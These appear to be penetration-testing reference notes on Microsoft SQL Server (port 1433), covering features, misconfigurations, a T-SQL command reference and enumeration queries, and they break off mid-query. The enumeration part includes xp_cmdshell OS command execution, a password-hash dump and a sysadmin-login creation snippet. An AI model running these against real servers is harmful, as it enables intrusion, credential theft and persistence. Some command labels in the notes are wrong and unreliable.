# P1433 MSSQL

## Index

* \[\[Ports, Protocols, and Services]]

## Microsoft SQL Server (MSSQL)

* **Port Number:** 1433 (default), 1434 (for SQL Server Browser)
* **Protocol:** TCP/UDP
* **Service Name:** Microsoft SQL Server (MSSQL)
* **Defined in:** Proprietary (Microsoft documentation)

Microsoft SQL Server (MSSQL) is a relational database management system (RDBMS) developed by Microsoft. It supports a wide variety of transaction processing, business intelligence, and analytics applications in corporate IT environments. MSSQL uses the Transact-SQL (T-SQL) language, which is an extension of SQL (Structured Query Language) developed by Microsoft and Sybase.

### Overview of Features

* **Relational Database Management:** MSSQL provides a full-featured RDBMS capable of handling vast amounts of data with ACID (Atomicity, Consistency, Isolation, Durability) properties.
* **T-SQL Support:** T-SQL extends SQL with procedural programming constructs, making it more powerful for complex queries and data manipulation.
* **High Availability:** Supports features such as Always On Availability Groups, database mirroring, and log shipping to ensure high availability and disaster recovery.
* **Scalability:** MSSQL can scale from small single-server environments to large, multi-server enterprise deployments with distributed databases and data warehousing capabilities.
* **Security Features:** Includes encryption (TDE), role-based security, data masking, auditing, and support for compliance standards like GDPR.
* **Business Intelligence (BI):** Integrated tools for BI, including SQL Server Reporting Services (SSRS), SQL Server Analysis Services (SSAS), and SQL Server Integration Services (SSIS).
* **Integration with Microsoft Ecosystem:** Seamless integration with other Microsoft products, such as Azure, Power BI, and SharePoint.

### Typical Use Cases

* **Enterprise Applications:** Backend database for enterprise-level applications, including ERP, CRM, and custom business solutions.
* **Data Warehousing:** Centralized storage of large datasets for reporting and analytics purposes.
* **Business Intelligence:** Enabling decision-making through data analysis, reporting, and visualization.
* **Transactional Processing:** Handling high-volume transaction processing, such as in banking, e-commerce, and online services.

### How MSSQL Works

1. **Client Connection:**
   * **Step 1:** The client connects to the SQL Server instance using a connection string that includes the server address and port (usually `<target_ip>:1433`).
   * **Step 2:** SQL Server Browser service (listening on UDP 1434) provides information about SQL Server instances and directs the client to the correct port if the default port is not used.
2. **Authentication:**
   * **Step 3:** The client provides credentials, which SQL Server authenticates either through Windows Authentication (using Active Directory) or SQL Server Authentication (username and password).
3. **Query Processing:**
   * **Step 4:** The client sends a T-SQL query to the server.
   * **Step 5:** SQL Server parses the query, generates an execution plan, and executes the query.
   * **Step 6:** The results of the query are sent back to the client.
4. **Transaction Management:**
   * **Step 7:** If the query involves a transaction, SQL Server ensures ACID properties are maintained, using transaction logs to ensure consistency and durability.
   * **Step 8:** The client can commit or roll back transactions depending on the application logic.
5. **Data Storage:**
   * **Step 9:** Data is stored in a structured format in database files (.mdf, .ndf, .ldf), with indexes to optimize query performance.
   * **Step 10:** SQL Server periodically writes dirty pages from memory (buffer pool) to disk in a process known as checkpointing.
6. **Backup and Recovery:**
   * **Step 11:** SQL Server supports full, differential, and transaction log backups, allowing for comprehensive data recovery strategies.
   * **Step 12:** In case of failure, data can be restored from backups, and transactions replayed from logs to achieve point-in-time recovery.

#### Diagram (Hypothetical Example)

* **Client:** `<attack_ip>` connects to `<target_ip>:1433` with credentials.
* **Server:** `<target_ip>` authenticates, processes the query, and returns the results.

## Additional Information

### Security Considerations

* **Encryption:** Transparent Data Encryption (TDE) is available to protect data at rest, while SSL/TLS can be used to secure data in transit.
* **SQL Injection:** SQL Server is susceptible to SQL Injection attacks if queries are not properly sanitized, allowing attackers to manipulate queries and gain unauthorized access.
* **Authentication Modes:** SQL Server can be configured in Mixed Mode (supporting both Windows and SQL Authentication) or Windows-only mode, with the latter being more secure.
* **Auditing and Compliance:** SQL Server includes built-in auditing capabilities to track changes and access, essential for meeting regulatory requirements.

### Advanced Features

* **Always On Availability Groups:** High availability and disaster recovery solution that provides an enterprise-level alternative to database mirroring.
* **SQL Server Agent:** A job scheduling system that allows administrators to automate tasks, such as backups and maintenance plans.
* **In-Memory OLTP:** Optimizes transaction processing by storing data in memory-optimized tables and reducing disk I/O.

### Modes of Operation

* **Single-User Mode:** Used for maintenance tasks, allowing only one connection to the database.
* **Multi-User Mode:** Default mode, allowing multiple concurrent connections.

### Components

MSSQL has several subcomponents and advanced features that impact its use:

**SQL Server Agent:** Used for scheduling and automating tasks. **SQL Server Reporting Services (SSRS):** Used for generating and managing reports. **SQL Server Integration Services (SSIS):** Used for data integration and workflow applications. **SQL Server Analysis Services (SSAS):** Used for online analytical processing (OLAP) and data mining.

### MSSQL Databases

MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. Here are the default databases and a brief description of each:

| **Default System Database** | **Description**                                                                                                                                                                                        |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Master                      | Tracks all system information for an SQL server instance                                                                                                                                               |
| Model                       | Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database |
| Msdb                        | The SQL Server Agent uses this database to schedule jobs & alerts                                                                                                                                      |
| Tempdb                      | Stores temporary objects                                                                                                                                                                               |
| Resource                    | Read-only database containing system objects included with SQL server                                                                                                                                  |

### Common MSSQL Database Files

| **File Type** | **Description**                                                                                   |
| ------------- | ------------------------------------------------------------------------------------------------- |
| .mdf          | Primary data file that contains the schema and data.                                              |
| .ndf          | Secondary data file used when the database is too large for a single primary data file.           |
| .ldf          | Log file that contains transaction log information for database recovery and rollback operations. |

### Types of Users

| **Name**                               | **Sysname**   | **Name of principal, unique within the database.**                                                                                                                                                                                                                                                                                  |
| -------------------------------------- | ------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| principal\_id                          | Int           | ID of principal, unique within the database.                                                                                                                                                                                                                                                                                        |
| Type                                   | char(1)       | Principal type: A = Application role C = User mapped to a certificate E = External user from Azure Active Directory G = Windows group K = User mapped to an asymmetric key R = Database role S = SQL user U = Windows user X = External group from Azure Active Directory group or applications                                     |
| type\_desc                             | nvarchar(60)  | Description of principal type. APPLICATION\_ROLE CERTIFICATE\_MAPPED\_USER EXTERNAL\_USER WINDOWS\_GROUP ASYMMETRIC\_KEY\_MAPPED\_USER DATABASE\_ROLE SQL\_USER WINDOWS\_USER EXTERNAL\_GROUPS                                                                                                                                      |
| default\_schema\_name                  | Sysname       | Name to be used when SQL name does not specify a schema. Null for principals not of type S, U, or A.                                                                                                                                                                                                                                |
| create\_date                           | Datetime      | Time at which the principal was created.                                                                                                                                                                                                                                                                                            |
| modify\_date                           | Datetime      | Time at which the principal was last modified.                                                                                                                                                                                                                                                                                      |
| owning\_principal\_id                  | Int           | ID of the principal that owns this principal. All fixed Database Roles are owned by dbo by default.                                                                                                                                                                                                                                 |
| Sid                                    | varbinary(85) | SID (Security Identifier) of the principal. NULL for SYS and INFORMATION SCHEMAS.                                                                                                                                                                                                                                                   |
| is\_fixed\_role                        | Bit           | If 1, this row represents an entry for one of the fixed database roles: db\_owner, db\_accessadmin, db\_datareader, db\_datawriter, db\_ddladmin, db\_securityadmin, db\_backupoperator, db\_denydatareader, db\_denydatawriter.                                                                                                    |
| authentication\_type                   | Int           | Applies to: SQL Server 2012 (11.x) and later. Signifies authentication type. The following are the possible values and their descriptions. 0 : No authentication 1 : Instance authentication 2 : Database authentication 3 : Windows authentication 4 : Azure Active Directory authentication                                       |
| authentication\_type\_desc             | nvarchar(60)  | Applies to: SQL Server 2012 (11.x) and later. Description of the authentication type. The following are the possible values and their descriptions. NONE : No authentication INSTANCE : Instance authentication DATABASE : Database authentication WINDOWS : Windows authentication EXTERNAL: Azure Active Directory authentication |
| default\_language\_name                | Sysname       | Applies to: SQL Server 2012 (11.x) and later. Signifies the default language for this principal.                                                                                                                                                                                                                                    |
| default\_language\_lcid                | Int           | Applies to: SQL Server 2012 (11.x) and later. Signifies the default LCID for this principal.                                                                                                                                                                                                                                        |
| allow\_encrypted\_value\_modifications | Bit           | Applies to: SQL Server 2016 (13.x) and later, SQL Database. Suppresses cryptographic metadata checks on the server in bulk copy operations. This enables the user to bulk copy data encrypted using Always Encrypted, between tables or databases, without decrypting the data. The default is OFF.                                 |

### Permissions

* **Securable:** These are the resources to which the SQL Server Database Engine authorization system controls access. There are three broader categories under which a securable can be differentiated:
  * Server – For example databases, logins, endpoints, availability groups and server roles
  * Database – For example database role, application roles, schema, certificate, full text catalog, user
  * Schema – For example table, view, procedure, function, synonym
* **Permission:** Every SQL Server securable has associated permissions like ALTER, CONTROL, CREATE that can be granted to a principal. Permissions are managed at the server level using logins and at the database level using users.
* **Principal:** The entity that receives permission to a securable is called a principal. The most common principals are logins and database users. Access to a securable is controlled by granting or denying permissions or by adding logins and users to roles which have access.

### Configuration Files

1. **SQL Server Configuration File:**
   * **File Location:** Typically located at `C:\Program Files\Microsoft SQL Server\MSSQL<version>\MSSQL\Binn\sqlservr.exe.config`
   * **Key Settings:**
     * `TCP/IP`: Specifies the enabled network protocols (TCP/IP, Named Pipes).
     * `Max Server Memory`: Controls the maximum amount of memory SQL Server can use.
     * `Authentication Mode`: Defines the authentication method (Windows Authentication, Mixed Mode).
2. **SQL Server Instance Configuration:**
   * **File Location:** Stored in the system registry.
   *   **Settings Example:**

       ```bash
       HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\<instance_name>
       ```
   * **Key Settings:**
     * `Port`: Defines the port on which the SQL Server instance listens.
     * `Service Account`: The Windows account under which the SQL Server service runs.
3. **SQL Server Agent Configuration:**
   * **File Location:** `C:\Program Files\Microsoft SQL Server\<instance_name>\MSSQL\Binn\SQLAGENT.OUT`
   * **Key Settings:**
     * `Job Execution`: Defines the jobs and schedules managed by SQL Server Agent.

### Potential Misconfigurations

1. **Weak Authentication:**
   * **Risk:** SQL Server configured to allow SQL Server Authentication with weak passwords can be easily brute-forced.
   * **Exploitation:** Attackers can use tools like `hydra` or `medusa` to perform brute-force attacks against weak credentials.
2. **Exposed MSSQL Port (1433):**
   * **Risk:** If MSSQL is exposed to the internet without adequate security controls, it becomes a target for attacks.
   * **Exploitation:** Attackers can use tools like `nmap` to identify open ports and services, followed by exploitation using tools like `Metasploit`.
3. **SQL Injection Vulnerabilities:**
   * **Risk:** Poorly written queries that concatenate user input directly into SQL commands can lead to SQL Injection attacks.
   * **Exploitation:** Attackers can use tools like `sqlmap` to automate the discovery and exploitation of SQL Injection vulnerabilities.
4. **Improper Permissions:**
   * **Risk:** Granting excessive permissions to users or roles can lead to privilege escalation within the database.
   * **Exploitation:** An attacker with limited access can escalate privileges by exploiting overly permissive roles.
5. **Outdated Software:**
   * **Risk:** Running an outdated version of SQL Server with known vulnerabilities can be exploited by attackers.
   * **Exploitation:** Attackers can use known CVEs and publicly available exploits to compromise the server.

### Default Credentials

* **SA Account:**
  * **Username:** `sa`
  * **Password:** (Set during installation, but historically has been left blank or with a weak password)
  * **Risk:** Leaving the `sa` account enabled with a weak or default password is a significant security risk.
* **SQL Server Authentication:**
  * **Default Accounts:**
    * **`sa`:** System Administrator account with full control.
    * **`guest`:** Account with very limited privileges, but can be a foothold for escalation.
  * **Common Issues:**
    * Failure to change default passwords.
    * Leaving unnecessary accounts enabled.

## Interaction and Tools

### \[\[MSSQL]]

SQL commands are instructions that are used to interact with the database. They can be categorized into different types based on their purpose:

#### MSSQL Commands

https://www.w3schools.com/sql/default.asp

**Data Query Language (DQL)**

*   **SELECT:** Retrieves data from one or more tables.

    ```sql
    SELECT column_name(s) FROM table_name WHERE condition;
    ```

    ```sql
    SELECT column1, column2, ...
    FROM table_name
    WHERE condition;
    ```
*   **JOIN:** Combining rows from two or more tables based on a related column.

    ```sql
    SELECT employees.first_name, departments.department_name
    FROM employees
    JOIN departments ON employees.department_id = departments.department_id;
    ```

**Data Definition Language (DDL)**

*   **CREATE:** Creates a new database object like a table, index, or view.

    ```sql
    CREATE TABLE table_name (column1 datatype PRIMARY KEY, column2 datatype, column3 datatype);
    ```

    ```sql
    CREATE TABLE table_name (
        column1 datatype PRIMARY KEY,
        column2 datatype,
        column3 datatype
    );
    ```
*   **ALTER:** Modifies the structure of an existing database object.

    ```sql
    ALTER TABLE table_name ADD column_name datatype;
    ```

    ```sql
    ALTER TABLE table_name
    ADD column_name datatype;
    ```
*   **DROP:** Deletes an existing database object.

    ```sql
    DROP TABLE table_name;
    ```
*   **TRUNCATE:** Removes all records from a table but does not delete the table structure.

    ```sql
    TRUNCATE TABLE table_name;
    ```

**Data Manipulation Language (DML)**

*   **INSERT:** Adds new records to a table.

    ```sql
    INSERT INTO table_name (column1, column2) VALUES (value1, value2);
    ```

    ```sql
    INSERT INTO table_name (column1, column2)
    VALUES (value1, value2);
    ```
*   **UPDATE:** Modifies existing records in a table.

    ```sql
    UPDATE table_name SET column1 = value1 WHERE condition;
    ```

    ```sql
    UPDATE table_name
    SET column1 = value1
    WHERE condition;
    ```
*   **DELETE:** Removes records from a table.

    ```sql
    DELETE FROM table_name WHERE condition;
    ```

    ```sql
    DELETE FROM table_name
    WHERE condition;
    ```
*   **MERGE:** To perform `INSERT`, `UPDATE`, or `DELETE` operations based on whether a row exists. Note: MERGE has specific syntax in MSSQL.

    ```sql
    MERGE INTO target_table USING source_table
    ON target_table.id = source_table.id
    WHEN MATCHED THEN
        UPDATE SET target_table.column1 = source_table.column1
    WHEN NOT MATCHED THEN
        INSERT (column1, column2, ...) VALUES (value1, value2, ...);
    ```

**Data Control Language (DCL)**

*   **GRANT:** Gives user access privileges to the database.

    ```sql
    GRANT privilege_name ON object_name TO 'user_name'@'host_name';
    ```

    ```sql
    GRANT privilege_name ON object_name TO 'user_name'@'host_name';
    ```
*   **REVOKE:** Removes user access privileges.

    ```sql
    REVOKE SELECT, INSERT ON table_name FROM 'user_name'@'host_name';
    ```

    ```sql
    REVOKE privilege_name ON object_name FROM 'user_name'@'host_name';
    ```

**Transaction Control Language (TCL)**

*   **COMMIT:** Saves all changes made during the current transaction.

    ```sql
    COMMIT;
    ```

    ```sql
    BEGIN TRANSACTION;
    UPDATE employees SET department = 'HR' WHERE employee_id = 1;
    COMMIT;
    ```
*   **ROLLBACK:** Undoes changes made during the current transaction.

    ```sql
    ROLLBACK;
    ```

    ```sql
    BEGIN TRANSACTION;
    UPDATE employees SET department = 'HR' WHERE employee_id = 1;
    ROLLBACK;
    ```
*   **SAVEPOINT:** Sets a savepoint within a transaction to which you can later roll back.

    ```sql
    SAVEPOINT savepoint_name;
    ```

    ```sql
    BEGIN TRANSACTION;
    UPDATE employees SET department = 'HR' WHERE employee_id = 1;
    SAVEPOINT sp1;
    UPDATE employees SET department = 'Finance' WHERE employee_id = 2;
    ROLLBACK TO sp1; -- Rolls back to the state after the first update.
    COMMIT;
    ```

**Set Operations**

*   **UNION:** Combines the results of two queries and removes duplicates.

    ```sql
    SELECT first_name FROM employees UNION SELECT first_name FROM managers;
    ```

    ```sql
    SELECT first_name FROM employees 
    UNION 
    SELECT first_name FROM managers;
    ```
*   **UNION ALL:** Combines the results of two queries without removing duplicates.

    ```sql
    SELECT first_name FROM employees UNION ALL SELECT first_name FROM managers;
    ```

    ```sql
    SELECT first_name FROM employees 
    UNION ALL 
    SELECT first_name FROM managers;
    ```
*   **INTERSECT:** Returns only the rows that are common in both queries.

    ```sql
    SELECT first_name FROM employees INTERSECT SELECT first_name FROM managers;
    ```

    ```sql
    SELECT first_name FROM employees
    INTERSECT
    SELECT first_name FROM managers;
    ```
*   **EXCEPT:** Returns the rows that are in the first query but not in the second.

    ```sql
    SELECT first_name FROM employees EXCEPT SELECT first_name FROM managers;
    ```

    ```sql
    SELECT first_name FROM employees
    EXCEPT
    SELECT first_name FROM managers;
    ```

**Aggregation**

*   **COUNT:** Counts the number of rows.

    ```sql
    SELECT COUNT(*) FROM employees;
    ```
*   **SUM:** Adds up values in a numeric column.

    ```sql
    SELECT SUM(salary) FROM employees;
    ```
*   **AVG:** Calculates the average value of a numeric column.

    ```sql
    SELECT AVG(salary) FROM employees;
    ```
*   **MAX**/**MIN:** Finds the maximum or minimum value in a column.

    ```sql
    SELECT MAX(salary) FROM employees;
    SELECT MIN(salary) FROM employees;
    ```

#### SQL Operators

**Arithmetic Operators**

*   Used to perform mathematical calculations.

    * **`+`:** Addition.
    * **`-`:** Subtraction.
    * **`*`:** Multiplication.
    * **`/`:** Division.
    * **`%`:** Modulus (remainder).

    ```sql
    SELECT salary * 1.1 AS new_salary FROM employees;
    ```

**Comparison Operators**

*   Used to compare two values.

    * **`=`:** Equal to.
    * **`<>` or `!=`:** Not equal to.
    * **`>`:** Greater than.
    * **`<`:** Less than.
    * **`>=`:** Greater than or equal to.
    * **`<=`:** Less than or equal to.

    ```sql
    SELECT * FROM employees WHERE salary > 50000;
    ```

**Logical Operators**

*   Used to combine multiple conditions.

    * **`AND`:** Returns true if both conditions are true.
    * **`OR`:** Returns true if either condition is true.
    * **`NOT`:** Reverses the result of the condition.

    ```sql
    SELECT * FROM employees WHERE department = 'Sales' AND salary > 50000;
    ```

**Bitwise Operators**

*   Used to perform bit-level operations.

    * **`&`:** Bitwise AND.
    * **`|`:** Bitwise OR.
    * **`^`:** Bitwise XOR.
    * **`~`:** Bitwise NOT.

    ```sql
    SELECT 5 & 3;  -- Result: 1 (binary 101 & 011 = 001)
    ```

**Other Operators**

*   **`IN`:** Checks if a value is within a list.

    ```sql
    SELECT * FROM employees WHERE department IN ('Sales', 'Marketing');
    ```
*   **`BETWEEN`:** Checks if a value is within a range.

    ```sql
    SELECT * FROM employees WHERE salary BETWEEN 40000 AND 60000;
    ```
*   **`LIKE`:** Used for pattern matching.

    ```sql
    SELECT * FROM employees WHERE first_name LIKE 'J%';
    ```
*   **`IS NULL`:** Checks for NULL values.

    ```sql
    SELECT * FROM employees WHERE department IS NULL;
    ```
*   **`EXISTS`:** Checks for the existence of rows in a subquery.

    ```sql
    SELECT * FROM employees WHERE EXISTS (     SELECT 1 FROM departments WHERE departments.department_id = employees.department_id );
    ```

#### Operator Precedence

* Operator precedence determines the order in which operators are evaluated in an SQL statement. Operators with higher precedence are evaluated before operators with lower precedence.
* **Precedence Order:**
  1. **Arithmetic Operators** (`*`, `/`, `%`, `+`, `-`)
  2. **Comparison Operators** (`=`, `<>`, `!=`, `>`, `<`, `>=`, `<=`)
  3. **Logical NOT** (`NOT`)
  4. **Logical AND** (`AND`)
  5. **Logical OR** (`OR`)
*   **Example:**

    ```sql
    SELECT * FROM employees
    WHERE salary > 50000 AND department = 'Sales' OR department = 'Marketing';
    ```
*   This will be evaluated as:

    ```sql
    SELECT * FROM employees
    WHERE (salary > 50000 AND department = 'Sales') OR department = 'Marketing';
    ```
*   To override precedence, parentheses can be used:

    ```sql
    SELECT * FROM employees
    WHERE salary > 50000 AND (department = 'Sales' OR department = 'Marketing');
    ```

#### SQL Query Filtering

* SQL query filtering refers to the process of narrowing down the data returned by a query based on specific conditions. This is primarily achieved using the `WHERE` clause, which is fundamental to controlling which rows of data are selected from a table. Filtering allows you to extract only the relevant subset of data, making your queries more efficient and meaningful.

**ORDER BY**

*   Sort the results of any query using `ORDER BY` and specifying the column to sort by. By default, the sort is done in ascending order, but you can also sort the results by `ASC` or `DESC`. It is also possible to sort by multiple columns, providing a secondary sort for duplicate values in one column.

    ```sql
    SELECT * FROM <table> ORDER BY <column>;

    SELECT * FROM logins ORDER BY password DESC;

    SELECT * FROM logins ORDER BY password DESC, id ASC;
    ```

**TOP/OFFSET-FETCH**

*   To implement offset functionality, you use the `OFFSET-FETCH` clause.

    ```sql
    SELECT TOP 2 * FROM table_name;
    ```

    ```sql
    SELECT * FROM logins
    ORDER BY id ASC
    OFFSET 1 ROWS FETCH NEXT 2 ROWS ONLY;
    ```

**WHERE**

*   To filter or search for specific data, use the `WHERE` clause with the `SELECT` statement to fine-tune the results. Note: String and date data types should be surrounded by single quotes ('), while numbers can be used directly.

    ```sql
    SELECT * FROM table_name WHERE <condition>;

    SELECT * FROM logins WHERE id > 1;

    SELECT * FROM logins where username = 'admin';
    ```

**LIKE**

*   Enable selecting records by matching a certain pattern with `LIKE`. The `%` symbol acts as a wildcard and matches zero or more characters. The `_` symbol is used to match exactly one character. The below query matches all usernames with exactly three characters in them.

    ```sql
    SELECT * FROM <table> WHERE <column> LIKE 'admin%';

    SELECT * FROM logins WHERE username like '___';
    ```

#### SQL Comments

* SQL comments are annotations or notes added to SQL code to explain, document, or temporarily disable parts of the SQL statements. Comments are ignored by the SQL interpreter or compiler, meaning they do not affect the execution of SQL queries.
* **Use Cases:**
  * **Documentation:** To describe what a particular section of code does, making it easier for developers and database administrators to understand the logic behind the query.
  * **Debugging:** To disable parts of the code temporarily without deleting them, allowing you to test different scenarios or troubleshoot issues.
  * **Collaboration:** To provide additional context for team members working on the same SQL script.

\| **Type** | **Description** | | | | | `--` | Hash comment (single-line) | | `-- comment` | SQL comment (single-line) | | `/* comment */` | C-style comment (multi-line) |

#### MSSQL Enumeration

**System Enumeration**

*   **Identify the Version of MSSQL:**

    ```sql
    SELECT @@VERSION;
    ```
*   **Identify the Hostname and Server Name:**

    ```sql
    SELECT HOST_NAME() AS Hostname; SELECT SERVERPROPERTY('MachineName') AS ServerName;
    ```
*   **Identify the Current User and Database:**

    ```sql
    SELECT CURRENT_USER AS CurrentUser; SELECT DB_NAME() AS CurrentDatabase;
    ```
*   **Identify the SQL Server Configuration Settings:**

    ```sql
    EXEC sp_configure;
    ```
*   **Identify the SQL Server Service Account:**

    ```sql
    EXEC xp_cmdshell 'whoami';
    ```
*   **Identify Operating System Information:**

    ```sql
    EXEC xp_cmdshell 'systeminfo';
    ```
*   **Identify Active Connections to the SQL Server:**

    ```sql
    SELECT session_id, login_name, host_name, program_name FROM sys.dm_exec_sessions WHERE is_user_process = 1;
    ```

**Databases, Tables, and Column Enumeration**

*   **List all databases:**

    ```sql
    SELECT name FROM sys.databases;
    ```
*   **Select one of the existing databases:**

    ```sql
    USE <database_name>;
    ```
*   **List all available tables in the selected database:**

    ```sql
    SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';
    ```
*   **List the table structure with its fields and data types:**

    ```sql
    EXEC sp_help '<table_name>';
    ```

    ```sql
    SELECT column_name, data_type, character_maximum_length 
    FROM information_schema.columns 
    WHERE table_name = '<table_name>';
    ```
*   **List all columns in the selected database:**

    ```sql
    SELECT column_name, data_type FROM information_schema.columns WHERE table_name = '<table_name>';
    ```
*   **Show everything in the desired table:**

    ```sql
    SELECT * FROM <table_name>;
    ```
*   **Search for needed string in the desired table.:**

    ```sql
    SELECT * FROM <table_name> WHERE <column_name> = '<string>';
    ```
*   **List All Tables Across All Databases (Advanced):**

    ```sql
    SELECT table_catalog, table_schema, table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';
    ```
*   **List All Columns Across All Tables (Advanced):**

    ```sql
    SELECT table_catalog, table_name, column_name, data_type FROM information_schema.columns 
    WHERE table_catalog = '<database_name>';
    ```
*   **Find Table Creation Date and Other Metadata:**

    ```sql
    SELECT name AS table_name, create_date FROM sys.tables WHERE schema_name(schema_id) = '<schema_name>';
    ```
*   **Tables Containing a Specific Column Name:**

    ```sql
    SELECT table_name FROM information_schema.columns WHERE column_name = '<column_name>';
    ```
*   **Tables with Specific Data Types:**

    ```sql
    SELECT table_name, column_name, data_type FROM information_schema.columns WHERE data_type = '<data_type>';
    ```
*   **List All Indexes on a Table:**

    ```sql
    EXEC sp_helpindex '<table_name>';
    ```
*   **List All Foreign Keys in a Database:**

    ```sql
    SELECT 
        fk.name AS foreign_key_name, 
        tp.name AS table_name, 
        cp.name AS column_name, 
        tr.name AS referenced_table_name, 
        cr.name AS referenced_column_name 
    FROM 
        sys.foreign_keys AS fk 
        INNER JOIN sys.tables AS tp ON fk.parent_object_id = tp.object_id 
        INNER JOIN sys.foreign_key_columns AS fkc ON fk.object_id = fkc.constraint_object_id 
        INNER JOIN sys.columns AS cp ON fkc.parent_column_id = cp.column_id AND fkc.parent_object_id = cp.object_id 
        INNER JOIN sys.tables AS tr ON fkc.referenced_object_id = tr.object_id 
        INNER JOIN sys.columns AS cr ON fkc.referenced_column_id = cr.column_id AND fkc.referenced_object_id = cr.object_id;
    ```
*   **List All Unique Constraints:**

    ```sql
    SELECT 
        tc.table_schema, 
        tc.table_name, 
        tc.constraint_name 
    FROM 
        information_schema.table_constraints AS tc 
    WHERE 
        tc.constraint_type = 'UNIQUE';
    ```
*   **Connect to a database on another host:**

    ```sql
    sqlcmd -S [server_name] -d [database_name] -U [user_name] -P [password]
    ```
*   **Connect to a database through a Unix socket:**

    ```sql
    sqlcmd -S tcp:[server_name],<port> -d [database_name] -U [user_name] -P [password]
    ```
*   **Execute SQL statements in a script file (batch file):**

    ```sql
    sqlcmd -S [server_name] -d [database_name] -U [user_name] -P [password] -i [filename.sql]
    ```
*   **Restore a database from a backup created with mysqldump (user will be prompted for a password):**

    ```sql
    sqlcmd -S [server_name] -d [database_name] -U [user_name] -P [password] -Q "RESTORE DATABASE [database_name] FROM DISK = '[path/to/backup.bak]'"
    ```
*   **Restore all databases from a backup (user will be prompted for a password):**

    ```sql
    -- Loop through databases in a script to restore each one. Heres an example for a single restore:
    sqlcmd -S [server_name] -U [user_name] -P [password] -Q "RESTORE DATABASE [database_name] FROM DISK = '[path/to/backup.bak]'"
    ```

**User Enumeration**

*   **Get all users:**

    ```sql
    SELECT * FROM sys.database_principals
    ```
*   **Get specific user:**

    ```sql
    SELECT user_name();
    ```
*   **Get current database users (not the server):** Useful when you cannot access the table sys.database\_principals

    ```sql
    EXEC sp_helpuser
    SELECT * FROM sysusers
    ```
*   **Get users with filtering:**

    ```sql
    1> SELECT name,
    2> create_date,
    3> modify_date,
    4> type_desc as type,
    5> authentication_type_desc as authentication_type,
    6> sid
    7> from sys.database_principals
    8> where type not in ('A', 'R')
    9> order by name;
    10> GO
    ```

    ```sql
    select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
    ```
*   **Create a new user with sysadmin privilege:**

    ```sql
    CREATE LOGIN <username> WITH PASSWORD = '<password>'
    ALTER SERVER ROLE sysadmin ADD MEMBER <username>;
    ```
*   **List All Users in the SQL Server:**

    ```sql
    SELECT name AS UserName FROM sys.syslogins;
    ```
*   **List All Users Mapped to a Specific Database:**

    ```sql
    USE <database_name>; SELECT dp.name AS UserName, dp.type_desc AS UserType FROM sys.database_principals dp WHERE dp.type NOT IN ('A', 'R', 'X') AND dp.sid IS NOT NULL;
    ```
*   **List All SQL Server Logins:**

    ```sql
    SELECT name AS LoginName FROM sys.sql_logins;
    ```
*   **Identify the Current Login and Associated Roles:**

    ```sql
    SELECT SYSTEM_USER AS CurrentLogin;
    SELECT ROLE_NAME() AS RoleName
    FROM sys.server_role_members rm
    JOIN sys.server_principals sp ON rm.role_principal_id = sp.principal_id
    WHERE member_principal_id = USER_ID();
    ```

**Permissions Enumeration**

*   **Show all different securable names:**

    ```sql
    SELECT distinct class_desc FROM sys.fn_builtin_permissions(DEFAULT);
    ```
*   **Show all possible permissions in MSSQL:**

    ```sql
    SELECT * FROM sys.fn_builtin_permissions(DEFAULT);
    ```
*   **Get all my permissions over server:**

    ```sql
    SELECT * FROM fn_my_permissions(NULL, 'SERVER');
    ```
*   **Get all my permissions over database:**

    ```sql
    USE <database>
    SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
    ```
*   **Get members of the role "sysadmin":**

    ```sql
    Use master
    EXEC sp_helpsrvrolemember 'sysadmin';
    ```
*   **Get if the current user is sysadmin:**

    ```sql
    SELECT IS_SRVROLEMEMBER('sysadmin');
    ```
*   **Get users that can run `xp_cmdshell`:**

    ```sql
    Use master
    EXEC sp_helprotect 'xp_cmdshell'
    ```
*   **List All Server-Level Permissions:**

    ```sql
    SELECT p.name AS PermissionName, p.type_desc AS PermissionType, pr.name AS PrincipalName, pr.type_desc AS PrincipalType
    FROM sys.server_permissions p
    JOIN sys.server_principals pr ON p.grantee_principal_id = pr.principal_id;
    ```
*   **List All Database-Level Permissions:**

    ```sql
    USE <database_name>;
    SELECT dp.name AS UserName, 
           dp.type_desc AS UserType, 
           dppr.permission_name AS PermissionName, 
           dppr.state_desc AS PermissionState
    FROM sys.database_permissions dppr
    JOIN sys.database_principals dp ON dppr.grantee_principal_id = dp.principal_id;
    ```
*   **List All Permissions on a Specific Table:**

    ```sql
    USE <database_name>;
    SELECT dp.name AS UserName, 
           dp.type_desc AS UserType, 
           dppr.permission_name AS PermissionName, 
           dppr.state_desc AS PermissionState
    FROM sys.database_permissions dppr
    JOIN sys.database_principals dp ON dppr.grantee_principal_id = dp.principal_id
    JOIN sys.objects o ON dppr.major_id = o.object_id
    WHERE o.name = '<table_name>';
    ```
*   **List All Role Memberships for the Current User:**

    ```sql
    USE <database_name>;
    SELECT dp.name AS UserName, drp.role_principal_id, drp.member_principal_id
    FROM sys.database_role_members drp
    JOIN sys.database_principals dp ON drp.member_principal_id = dp.principal_id
    WHERE dp.name = USER_NAME();
    ```
*   **Identify Database Roles Assigned to Users:**

    ```sql
    USE <database_name>;
    SELECT dp.name AS RoleName, dp2.name AS UserName
    FROM sys.database_role_members drm
    JOIN sys.database_principals dp ON drm.role_principal_id = dp.principal_id
    JOIN sys.database_principals dp2 ON drm.member_principal_id = dp2.principal_id;
    ```

**Stored Procedures and Functions Enumeration**

*   **List All Stored Procedures in a Database:**

    ```sql
    USE <database_name>;
    SELECT name AS ProcedureName, type_desc AS ProcedureType
    FROM sys.objects
    WHERE type IN ('P', 'X'); -- P = SQL Stored Procedure, X = Extended Stored Procedure
    ```
*   **List All User-Defined Functions in a Database:**

    ```sql
    USE <database_name>;
    SELECT name AS FunctionName, type_desc AS FunctionType
    FROM sys.objects
